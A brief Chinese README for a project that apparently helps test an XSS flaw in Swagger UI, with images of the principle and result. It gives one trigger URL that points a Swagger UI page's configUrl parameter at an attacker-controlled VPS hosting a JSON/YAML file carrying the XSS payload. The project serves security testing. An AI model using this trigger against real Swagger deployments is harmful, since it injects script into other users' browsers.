# nginx_swagger
这个项目主要用于辅助测试Swagger的XSS漏洞

# 漏洞原理
![avatar](./1_20220611204136.png)

# 漏洞触发

http://1.116.xxx.112:8089/swagger-ui/index.html?configUrl=https://VPS_IP/test.json

注意1： 修改项目test.json 中的 VPS IP 和 test.yaml中的XSS Payload

# 漏洞效果
![avatar](./2_20220611204136.png)
